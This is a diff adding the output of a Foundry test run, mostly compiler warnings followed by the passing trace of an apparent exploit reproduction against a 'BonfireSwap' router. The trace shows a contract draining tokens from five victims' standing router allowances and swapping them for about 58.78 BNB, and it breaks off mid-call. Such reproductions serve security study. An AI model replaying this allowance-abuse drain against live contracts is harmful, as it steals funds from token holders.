@@ -1,0 +1,1079 @@
+Compiling 20 files with Solc 0.8.35
+Solc 0.8.35 finished in 457.31ms
+Compiler run successful with warnings:
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1241:9:
+     |
+1241 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1255:9:
+     |
+1255 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1263:79:
+     |
+1263 |     function assertApproxEqAbs(uint256 left, uint256 right, uint256 maxDelta, string calldata error) external pure;
+     |                                                                               ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1270:77:
+     |
+1270 |     function assertApproxEqAbs(int256 left, int256 right, uint256 maxDelta, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1287:9:
+     |
+1287 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1305:9:
+     |
+1305 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1315:86:
+     |
+1315 |     function assertApproxEqRel(uint256 left, uint256 right, uint256 maxPercentDelta, string calldata error)
+     |                                                                                      ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1326:84:
+     |
+1326 |     function assertApproxEqRel(int256 left, int256 right, uint256 maxPercentDelta, string calldata error)
+     |                                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1335:77:
+     |
+1335 |     function assertEqDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1342:75:
+     |
+1342 |     function assertEqDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1348:46:
+     |
+1348 |     function assertEq(bool left, bool right, string calldata error) external pure;
+     |                                              ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1354:68:
+     |
+1354 |     function assertEq(string calldata left, string calldata right, string calldata error) external pure;
+     |                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1360:66:
+     |
+1360 |     function assertEq(bytes calldata left, bytes calldata right, string calldata error) external pure;
+     |                                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1366:68:
+     |
+1366 |     function assertEq(bool[] calldata left, bool[] calldata right, string calldata error) external pure;
+     |                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1372:74:
+     |
+1372 |     function assertEq(uint256[] calldata left, uint256[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1378:72:
+     |
+1378 |     function assertEq(int256[] calldata left, int256[] calldata right, string calldata error) external pure;
+     |                                                                        ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1387:74:
+     |
+1387 |     function assertEq(address[] calldata left, address[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1393:74:
+     |
+1393 |     function assertEq(bytes32[] calldata left, bytes32[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1399:72:
+     |
+1399 |     function assertEq(string[] calldata left, string[] calldata right, string calldata error) external pure;
+     |                                                                        ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1405:70:
+     |
+1405 |     function assertEq(bytes[] calldata left, bytes[] calldata right, string calldata error) external pure;
+     |                                                                      ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1408:52:
+     |
+1408 |     function assertEq(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1414:50:
+     |
+1414 |     function assertEq(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1420:52:
+     |
+1420 |     function assertEq(address left, address right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1426:52:
+     |
+1426 |     function assertEq(bytes32 left, bytes32 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1432:42:
+     |
+1432 |     function assertFalse(bool condition, string calldata error) external pure;
+     |                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1440:77:
+     |
+1440 |     function assertGeDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1448:75:
+     |
+1448 |     function assertGeDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1455:52:
+     |
+1455 |     function assertGe(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1462:50:
+     |
+1462 |     function assertGe(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1470:77:
+     |
+1470 |     function assertGtDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1478:75:
+     |
+1478 |     function assertGtDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1485:52:
+     |
+1485 |     function assertGt(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1492:50:
+     |
+1492 |     function assertGt(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1500:77:
+     |
+1500 |     function assertLeDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1508:75:
+     |
+1508 |     function assertLeDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1515:52:
+     |
+1515 |     function assertLe(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1522:50:
+     |
+1522 |     function assertLe(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1530:77:
+     |
+1530 |     function assertLtDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1538:75:
+     |
+1538 |     function assertLtDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1545:52:
+     |
+1545 |     function assertLt(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1552:50:
+     |
+1552 |     function assertLt(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1559:80:
+     |
+1559 |     function assertNotEqDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                                ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1566:78:
+     |
+1566 |     function assertNotEqDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                              ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1572:49:
+     |
+1572 |     function assertNotEq(bool left, bool right, string calldata error) external pure;
+     |                                                 ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1578:71:
+     |
+1578 |     function assertNotEq(string calldata left, string calldata right, string calldata error) external pure;
+     |                                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1584:69:
+     |
+1584 |     function assertNotEq(bytes calldata left, bytes calldata right, string calldata error) external pure;
+     |                                                                     ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1590:71:
+     |
+1590 |     function assertNotEq(bool[] calldata left, bool[] calldata right, string calldata error) external pure;
+     |                                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1596:77:
+     |
+1596 |     function assertNotEq(uint256[] calldata left, uint256[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1602:75:
+     |
+1602 |     function assertNotEq(int256[] calldata left, int256[] calldata right, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1611:77:
+     |
+1611 |     function assertNotEq(address[] calldata left, address[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1617:77:
+     |
+1617 |     function assertNotEq(bytes32[] calldata left, bytes32[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1623:75:
+     |
+1623 |     function assertNotEq(string[] calldata left, string[] calldata right, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1629:73:
+     |
+1629 |     function assertNotEq(bytes[] calldata left, bytes[] calldata right, string calldata error) external pure;
+     |                                                                         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1632:55:
+     |
+1632 |     function assertNotEq(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1638:53:
+     |
+1638 |     function assertNotEq(int256 left, int256 right, string calldata error) external pure;
+     |                                                     ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1644:55:
+     |
+1644 |     function assertNotEq(address left, address right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1650:55:
+     |
+1650 |     function assertNotEq(bytes32 left, bytes32 right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1656:41:
+     |
+1656 |     function assertTrue(bool condition, string calldata error) external pure;
+     |                                         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (4591): There are more than 256 warnings. Ignoring the rest.
+
+Ran 1 test for test/BonfireSwap_exp.sol:BonfireSwap_exp
+[PASS] testExploit() (gas: 1088295)
+Logs:
+  BNB extracted (5-victim subset ~98.7% of drain): 58.780939117409582177
+
+Traces:
+  [536421] BonfireSwap_exp::setUp()
+    ├─ [0] VM::createSelectFork("<rpc url>", 122003953 [1.22e8])
+    │   └─ ← [Return] 0
+    ├─ [494928] → new BonfireForcedSeller@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 2472 bytes of code
+    └─ ← [Stop]
+
+  [1212695] BonfireSwap_exp::testExploit()
+    ├─ [2638] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::allowance(0xefF2FC4E3145f58F534d68A36Bcd3085Be6a4096, 0x17e801E17CeFC6334059189c178D4783830E03D3) [staticcall]
+    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564038957584007913129639935 [1.157e77]
+    ├─ [0] VM::assertGt(115792089237316195423570985008687907853269984665640564038957584007913129639935 [1.157e77], 0, "victim has standing allowance to router") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertTrue(true, "victim != attacker") [staticcall]
+    │   └─ ← [Return]
+    ├─ [638] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::allowance(0xefF2FC4E3145f58F534d68A36Bcd3085Be6a4096, 0x17e801E17CeFC6334059189c178D4783830E03D3) [staticcall]
+    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564038957584007913129639935 [1.157e77]
+    ├─ [0] VM::assertGt(115792089237316195423570985008687907853269984665640564038957584007913129639935 [1.157e77], 0, "victim has standing allowance to router") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertTrue(true, "victim != attacker") [staticcall]
+    │   └─ ← [Return]
+    ├─ [2638] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::allowance(0xB5FA67EaA51b82dcf807021714af6E9469a8C60a, 0x17e801E17CeFC6334059189c178D4783830E03D3) [staticcall]
+    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
+    ├─ [0] VM::assertGt(115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77], 0, "victim has standing allowance to router") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertTrue(true, "victim != attacker") [staticcall]
+    │   └─ ← [Return]
+    ├─ [2638] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::allowance(0x0e209754d8Ad3d277f94288a5FC10854e11e9636, 0x17e801E17CeFC6334059189c178D4783830E03D3) [staticcall]
+    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
+    ├─ [0] VM::assertGt(115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77], 0, "victim has standing allowance to router") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertTrue(true, "victim != attacker") [staticcall]
+    │   └─ ← [Return]
+    ├─ [2638] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::allowance(0x7a8A1060CC281D0263Dc45B0ff5B98a6cD3b9Acd, 0x17e801E17CeFC6334059189c178D4783830E03D3) [staticcall]
+    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
+    ├─ [0] VM::assertGt(115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77], 0, "victim has standing allowance to router") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertTrue(true, "victim != attacker") [staticcall]
+    │   └─ ← [Return]
+    ├─ [2638] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::allowance(0x1Aa7202824a667783Be76b64d4d38a74a322f604, 0x17e801E17CeFC6334059189c178D4783830E03D3) [staticcall]
+    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
+    ├─ [0] VM::assertGt(115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77], 0, "victim has standing allowance to router") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertTrue(true, "victim != attacker") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::prank(attackerEOA: [0x4AA2E86F6DeF408d1b5906FB5AE41E31E013f0CD], attackerEOA: [0x4AA2E86F6DeF408d1b5906FB5AE41E31E013f0CD])
+    │   └─ ← [Return]
+    ├─ [1155901] BonfireForcedSeller::drain([0xefF2FC4E3145f58F534d68A36Bcd3085Be6a4096, 0xefF2FC4E3145f58F534d68A36Bcd3085Be6a4096, 0xB5FA67EaA51b82dcf807021714af6E9469a8C60a, 0x0e209754d8Ad3d277f94288a5FC10854e11e9636, 0x7a8A1060CC281D0263Dc45B0ff5B98a6cD3b9Acd, 0x1Aa7202824a667783Be76b64d4d38a74a322f604], [2644176000944142651753 [2.644e21], 2644928766184339197335 [2.644e21], 35793541251552693748 [3.579e19], 8914921028910356181 [8.914e18], 8879656371956250055 [8.879e18], 8844138239216892382 [8.844e18]])
+    │   ├─ [12222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xefF2FC4E3145f58F534d68A36Bcd3085Be6a4096) [staticcall]
+    │   │   └─ ← [Return] 5875946668764761448339 [5.875e21]
+    │   ├─ [192998] 0x17e801E17CeFC6334059189c178D4783830E03D3::transfer(0xefF2FC4E3145f58F534d68A36Bcd3085Be6a4096, 2644176000944142651753 [2.644e21], BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1789463732 [1.789e9])
+    │   │   ├─ [57435] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::transferFrom(0xefF2FC4E3145f58F534d68A36Bcd3085Be6a4096, 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, 2644176000944142651753 [2.644e21])
+    │   │   │   ├─ emit Transfer(from: 0xefF2FC4E3145f58F534d68A36Bcd3085Be6a4096, to: 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, amount: 2379758400849728386579 [2.379e21])
+    │   │   │   ├─ emit Approval(owner: 0xefF2FC4E3145f58F534d68A36Bcd3085Be6a4096, spender: 0x17e801E17CeFC6334059189c178D4783830E03D3, amount: 115792089237316195423570985008687907853269984665640564036313408006968986988182 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x0e70f7349d87c30a3bb207941a643cb71811eac6aa218ed7bbfaa27889f37af8: 0x4a83e8d91c3fca77eb842504e35c34c9b32619703377edcdad6788f23821f35c → 0x4af2c83d0fef9928a0459af1fad0295f78ac4d100e17d94880efb5fbafb2e73c
+    │   │   │   │   @ 10: 0xb5fddd09d4ba0c0ddb65f3e400644f311b3fc1e4b319f054f2c1e8141f9925e7 → 0xb5f7b42ef1daf2595f94b6e7b755e9fa49564a1476b045676357873d955c3307
+    │   │   │   │   @ 11: 0x000000000000000000000000000000000000000000004840ec5066f982e0e6d3 → 0x00000000000000000000000000000000000000000000484817146a25354e947e
+    │   │   │   │   @ 0xd40fc42a02c2fa7d1e9e34cbe6b01b7689000a13e1f34c5ea3b713c2e3544d31: 0x0111c2720dd804aad46c3d1a057806f478e223c88197142af0f1944b23e36a82 → 0x00969158546a029128084d345be747f10f8900882e23d2d4fe94a59497d890e2
+    │   │   │   │   @ 0xd506f4495fb33e52df08a8807e5e6a6ddb260b96689d8a7265416641576e1ef3: 0x0006c0f8ee8156185dfa838922ee44eb7442cf4aab4450de7bbd7eb3decb52d9 → 0x000ce9d3d1606fccd9cbc0856bfcaa22462c471ae7adfbcc0b27df8a690845b9
+    │   │   │   │   @ 0xf4f92df4bb053eb88795bc6e59760a494e4e4e072ee211af9797c80531b80bdb: 0xffffffffffffffffffffffffffffffffffffffffffffffe4e51b291d10afffff → 0xffffffffffffffffffffffffffffffffffffffffffffff558dcae9b3201e6e96
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [2494] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000056b3f7df414d17ed242200000000000000000000000000000000000000000000013df1cafd421ff9c7ef000000000000000000000000000000000000000000000000000000006aa8ba32
+    │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   └─ ← [Return] 411877558020992100183527 [4.118e23]
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   └─ ← [Return] 411877558020992100183527 [4.118e23]
+    │   │   ├─ [2557] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token1() [staticcall]
+    │   │   │   └─ ← [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
+    │   │   ├─ [2534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   └─ ← [Return] 5865040887934810179567 [5.865e21]
+    │   │   ├─ [494] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000056b3f7df414d17ed242200000000000000000000000000000000000000000000013df1cafd421ff9c7ef000000000000000000000000000000000000000000000000000000006aa8ba32
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [366] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::totalSupply() [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
+    │   │   ├─ [11203] 0xf33D46ecBB9fEdF80F8fEeBa8eb9d3c1053d3f91::computeSwapAmountsWithReflection(5865040887934810179567 [5.865e21], 411877558020992100183527 [4.118e23], 5865040887934810179567 [5.865e21], 409443345782430042498082 [4.094e23], 5, 1000000000000000000000000 [1e24], 2) [staticcall]
+    │   │   │   ├─ [3848] 0x122f7B4504DdFf2151636811fC9E6DB066f6d437::computeSwapAmountsWithReflection(5865040887934810179567 [5.865e21], 411877558020992100183527 [4.118e23], 5865040887934810179567 [5.865e21], 409443345782430042498082 [4.094e23], 5, 1000000000000000000000000 [1e24], 2) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000086641d6c398f7131a1
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000086641d6c398f7131a1
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [6222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [66372] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::swap(2479077747049672815009 [2.479e21], 0, BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
+    │   │   │   ├─ [35846] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::transfer(BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 2479077747049672815009 [2.479e21])
+    │   │   │   │   ├─ emit Transfer(from: 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, to: BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 2231169972344705533509 [2.231e21])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0 → 0x0067efa842da8a42e457a18e6cd920e07edb2742fbed0b67c8ae0b415df63eb2
